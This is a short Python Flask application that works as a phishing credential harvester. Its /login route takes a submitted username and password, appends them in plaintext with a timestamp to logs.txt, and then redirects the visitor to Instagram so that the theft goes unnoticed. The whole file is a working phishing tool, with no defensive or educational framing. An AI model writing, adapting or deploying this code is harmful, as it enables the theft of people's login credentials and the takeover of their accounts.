from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]; password = request.form["password"]
        dt = datetime.now().strftime("%A %b %Y At %I:%M:%S")
        open("logs.txt", "a").write(f"Username: {username} \nPassword: {password}\nTime: {dt} \n\n") 
    
    return redirect("https://www.instagram.com/")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)